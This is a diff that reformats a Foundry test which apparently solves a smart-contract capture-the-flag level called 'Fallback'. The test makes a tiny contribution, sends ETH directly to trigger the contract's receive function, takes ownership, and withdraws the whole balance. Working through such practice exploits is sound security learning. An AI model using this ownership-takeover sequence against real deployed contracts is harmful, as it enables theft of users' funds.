@@ -3,7 +3,7 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 
-import {Fallback} from "./Fallback.sol";   
+import {Fallback} from "./Fallback.sol";
 
 contract FallbackTest is Test {
     Fallback level;
@@ -20,14 +20,14 @@ contract FallbackTest is Test {
     function test_exploitFallback() public {
         vm.startPrank(player);
         level.contribute{value: 1 wei}();
-        assertEq( level.contributions(player) , 1 wei ,"Contribution not registered");
-        (bool sent, ) = address(level).call{value: 1 wei}("");
+        assertEq(level.contributions(player), 1 wei, "Contribution not registered");
+        (bool sent,) = address(level).call{value: 1 wei}("");
         assertTrue(sent, "Sending ETH failed");
-        assertEq(level.owner(),player,"Player did not become owner via receive()");
+        assertEq(level.owner(), player, "Player did not become owner via receive()");
         level.withdraw();
         uint256 balanceAfter = address(level).balance;
         assertEq(balanceAfter, 0, "Contract still has ETH after withdraw");
-        assertEq(level.owner(),player,"Final owner check failed");
+        assertEq(level.owner(), player, "Final owner check failed");
         vm.stopPrank();
         console2.log("Exploit successful!");
         console2.log("Player is now owner:", player);
